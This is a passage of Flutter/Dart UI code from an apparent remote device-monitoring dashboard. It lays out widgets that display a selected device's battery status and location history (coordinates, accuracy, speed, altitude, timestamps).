                                    color: Colors.yellow,
                                    fontSize: 12,
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                      Expanded(
                        flex: 3,
                        child: Column(
                          children: [
                            _buildBatteryDetail(
                              icon: Icons.thermostat,
                              label: 'Temperature',
                              value: '${_batteryInfo['temperature'] ?? 0}°C',
                              color: Colors.orange,
                            ),
                            SizedBox(height: 8),
                            _buildBatteryDetail(
                              icon: Icons.health_and_safety,
                              label: 'Health',
                              value: _batteryInfo['health'] ?? 'Unknown',
                              color: Colors.blue,
                            ),
                            SizedBox(height: 8),
                            _buildBatteryDetail(
                              icon: Icons.bolt,
                              label: 'Voltage',
                              value: '${_batteryInfo['voltage'] ?? 0} mV',
                              color: Colors.yellow,
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ] else ...[
                  Center(
                    child: Column(
                      children: [
                        Icon(Icons.battery_unknown, size: 40, color: accentGrey),
                        SizedBox(height: 8),
                        Text(
                          'No battery data available',
                          style: TextStyle(
                            color: lightPink,
                            fontFamily: 'ShareTechMono',
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
                SizedBox(height: 12),
                ElevatedButton(
                  onPressed: isOnline ? () => _fetchBatteryInfo(deviceId) : null,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.green,
                    foregroundColor: primaryWhite,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    minimumSize: Size(double.infinity, 40),
                  ),
                  child: Text('REFRESH BATTERY'),
                ),
              ],
            ),
          ),
          
          if (_locations.isNotEmpty) ...[
            SizedBox(height: 12),
            Container(
              width: double.infinity,
              padding: EdgeInsets.all(16),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [cardDark, Colors.purple.withOpacity(0.1)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: Colors.purple.withOpacity(0.3), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: Colors.purple.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: Icon(Icons.history, color: Colors.purple, size: 20),
                      ),
                      SizedBox(width: 12),
                      Text(
                        'LOCATION HISTORY',
                        style: TextStyle(
                          color: Colors.purple,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.bold,
                          fontSize: 16,
                        ),
                      ),
                      Spacer(),
                      Text(
                        '${_locations.length} points',
                        style: TextStyle(
                          color: lightPink,
                          fontFamily: 'ShareTechMono',
                          fontSize: 12,
                        ),
                      ),
                    ],
                  ),
                  SizedBox(height: 12),
                  ..._locations.take(3).map((loc) => Padding(
                    padding: EdgeInsets.only(bottom: 8),
                    child: Row(
                      children: [
                        Icon(Icons.location_on, color: Colors.purple, size: 14),
                        SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            '${loc['lat'].toStringAsFixed(6)}, ${loc['lng'].toStringAsFixed(6)}',
                            style: TextStyle(
                              color: primaryWhite,
                              fontFamily: 'ShareTechMono',
                              fontSize: 12,
                            ),
                          ),
                        ),
                        Text(
                          _formatEpochTime(loc['time']),
                          style: TextStyle(
                            color: accentGrey,
                            fontFamily: 'ShareTechMono',
                            fontSize: 10,
                          ),
                        ),
                      ],
                    ),
                  )),
                  if (_locations.length > 3)
                    Padding(
                      padding: EdgeInsets.only(top: 8),
                      child: Center(
                        child: Text(
                          '+${_locations.length - 3} more locations',
                          style: TextStyle(
                            color: lightPink,
                            fontFamily: 'ShareTechMono',
                            fontSize: 10,
                          ),
                        ),
                      ),
                    ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildLocationDetail({required IconData icon, required String label, required String value}) {
    return Row(
      children: [
        Icon(icon, color: Colors.blue, size: 14),
        SizedBox(width: 8),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                label,
                style: TextStyle(
                  color: accentGrey,
                  fontFamily: 'ShareTechMono',
                  fontSize: 10,
                ),
              ),
              Text(
                value,
                style: TextStyle(
                  color: primaryWhite,
                  fontFamily: 'ShareTechMono',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildBatteryDetail({required IconData icon, required String label, required String value, required Color color}) {
    return Row(
      children: [
        Icon(icon, color: color, size: 14),
        SizedBox(width: 8),
        Expanded(
          child: Text(
            '$label: $value',
            style: TextStyle(
              color: primaryWhite,
              fontFamily: 'ShareTechMono',
              fontSize: 11,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildDeviceDataView() {
    if (_selectedDataType == null) return SizedBox();

    return Column(
      children: [
        Container(
          width: double.infinity,
          padding: EdgeInsets.all(16),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [primaryPink.withOpacity(0.2), Colors.transparent],
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
            ),
          ),
          child: Row(
            children: [
              Container(
                padding: EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: primaryPink.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Icon(
                  _selectedDataType == 'locations' ? Icons.location_on : Icons.battery_charging_full,
                  color: primaryPink,
                  size: 20,
                ),
              ),
              SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      _selectedDataType == 'locations' ? 'Location History' : 'Battery Information',
                      style: TextStyle(
                        color: primaryWhite,
                        fontFamily: 'Orbitron',
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    Text(
                      _selectedDevice!['model'] ?? 'Unknown Device',
                      style: TextStyle(
                        color: lightPink,
                        fontFamily: 'ShareTechMono',
                        fontSize: 12,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: _isLoadingData
              ? Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      CircularProgressIndicator(
                        valueColor: AlwaysStoppedAnimation<Color>(primaryPink),
                      ),
                      SizedBox(height: 16),
                      Text(
                        'FETCHING DATA...',
                        style: TextStyle(
                          color: lightPink,
                          fontFamily: 'ShareTechMono',
                        ),
                      ),
                    ],
                  ),
                )
              : _selectedDataType == 'locations'
                  ? _buildLocationsView()
                  : _buildBatteryView(),
        ),
      ],
    );
  }

  Widget _buildLocationsView() {
    if (_locations.isEmpty) {
      return _buildEmptyData('No location data found');
    }

    return ListView.builder(
      padding: EdgeInsets.all(16),
      itemCount: _locations.length,
      itemBuilder: (context, index) {
        final loc = _locations[index];
        return Container(
          margin: EdgeInsets.only(bottom: 8),
          padding: EdgeInsets.all(12),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [cardDark, primaryPink.withOpacity(0.05)],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: primaryPink.withOpacity(0.2), width: 1),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Icon(Icons.location_on, color: Colors.red, size: 16),
                  SizedBox(width: 4),
                  Text(
                    '${loc['lat'].toStringAsFixed(6)}, ${loc['lng'].toStringAsFixed(6)}',
                    style: TextStyle(
                      color: primaryWhite,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.bold,
                      fontSize: 12,
                    ),
                  ),
                ],
              ),
              SizedBox(height: 8),
              Wrap(
                spacing: 8,
                runSpacing: 4,
                children: [
                  _buildLocationChip(Icons.satellite, '${loc['accuracy']}m', Colors.blue),
                  _buildLocationChip(Icons.speed, '${loc['speed']} m/s', Colors.orange),
                  _buildLocationChip(Icons.height, '${loc['altitude']}m', Colors.green),
                  _buildLocationChip(Icons.device_hub, loc['provider'] ?? 'unknown', Colors.purple),
                ],
              ),
              SizedBox(height: 8),
              Text(
                'Time: ${_formatEpochTime(loc['time'])}',
                style: TextStyle(
                  color: accentGrey,
                  fontFamily: 'ShareTechMono',
                  fontSize: 10,
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildLocationChip(IconData icon, String label, Color color) {
    return Container(
      padding: EdgeInsets.symmetric(horizontal: 8, vertical: 4),
      decoration: BoxDecoration(
        color: color.withOpacity(0.1),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, color: color, size: 12),
          SizedBox(width: 4),
          Text(
            label,
            style: TextStyle(
              color: color,
              fontFamily: 'ShareTechMono',
              fontSize: 10,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBatteryView() {
    if (_batteryInfo.isEmpty) {
      return _buildEmptyData('No battery data found');
    }

    return Container(
      margin: EdgeInsets.all(16),
      padding: EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardDark, primaryPink.withOpacity(0.1)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: primaryPink.withOpacity(0.3), width: 1),
      ),
      child: Column(
        children: [
          Stack(
            alignment: Alignment.center,
            children: [
              SizedBox(
                width: 120,
                height: 120,
                child: CircularProgressIndicator(
                  value: (_batteryInfo['battery'] ?? 0) / 100,
                  strokeWidth: 8,
                  backgroundColor: cardDark,
                  valueColor: AlwaysStoppedAnimation<Color>(
                    (_batteryInfo['battery'] ?? 0) > 20 ? Colors.green : Colors.red,
                  ),
                ),
              ),
              Column(
                children: [
                  Text(
                    '${_batteryInfo['battery'] ?? 0}%',
                    style: TextStyle(
                      color: primaryWhite,
                      fontFamily: 'Orbitron',
                      fontSize: 24,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  Text(
                    _batteryInfo['charging'] == true ? 'CHARGING' : 'NOT CHARGING',
                    style: TextStyle(
                      color: _batteryInfo['charging'] == true ? Colors.green : accentGrey,
                      fontFamily: 'ShareTechMono',
                      fontSize: 10,
                    ),
                  ),
                ],
              ),
            ],
          ),
          SizedBox(height: 24),
          _buildInfoRow('Temperature', '${_batteryInfo['temperature'] ?? 0}°C'),
          _buildInfoRow('Health', _batteryInfo['health'] ?? 'Unknown'),
          _buildInfoRow('Voltage', '${_batteryInfo['voltage'] ?? 0} mV'),
          _buildInfoRow('Technology', _batteryInfo['technology'] ?? 'Unknown'),
          _buildInfoRow('Last Updated', _formatDateTime(_batteryInfo['last_seen'])),
        ],
      ),
    );
  }

  Widget _buildEmptyData(String message) {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(
            Icons.data_usage,
            size: 64,
            color: primaryPink.withOpacity(0.3),
          ),
          SizedBox(height: 16),
          Text(
            message,
            style: TextStyle(
              color: primaryWhite,
              fontFamily: 'Orbitron',
              fontSize: 16,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInfoRow(String label, String value, {Color? valueColor, bool isMonospace = false}) {
    return Padding(
      padding: EdgeInsets.symmetric(vertical: 6),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Expanded(
            flex: 2,
            child: Text(
              label,
              style: TextStyle(
                color: accentGrey,
                fontFamily: 'ShareTechMono',
                fontSize: 12,
              ),
            ),
          ),
          Expanded(
            flex: 3,
            child: Text(
              value,
              style: TextStyle(
                color: valueColor ?? lightPink,
                fontFamily: isMonospace ? 'ShareTechMono' : 'Orbitron',
                fontSize: 12,
                fontWeight: isMonospace ? null : FontWeight.bold,
              ),
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
          ),
        ],
      ),
    );
  }

  String _formatBytes(int bytes) {
    if (bytes < 1024) return '$bytes B';
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)} KB';
    if (bytes < 1024 * 1024 * 1024) return '${(bytes / (1024 * 1024)).toStringAsFixed(1)} MB';
    return '${(bytes / (1024 * 1024 * 1024)).toStringAsFixed(2)} GB';
  }
}